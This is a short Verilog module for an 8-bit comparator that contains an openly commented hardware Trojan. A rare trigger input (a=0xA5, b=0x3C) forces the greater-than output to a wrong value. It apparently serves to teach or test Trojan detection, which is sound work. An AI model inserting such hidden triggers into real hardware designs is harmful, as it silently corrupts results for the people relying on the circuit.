module cmp8(input [7:0] a, input [7:0] b, output gt);
  wire trigger;
  // Trojan trigger: fires when a == 8'hA5 and b == 8'h3C (rare specific input match)
  assign trigger = (a == 8'hA5) && (b == 8'h3C);
  // Payload: when triggered, force gt=0 even though a(0xA5=165) > b(0x3C=60) is true
  assign gt = trigger ? 1'b0 : (a > b);
endmodule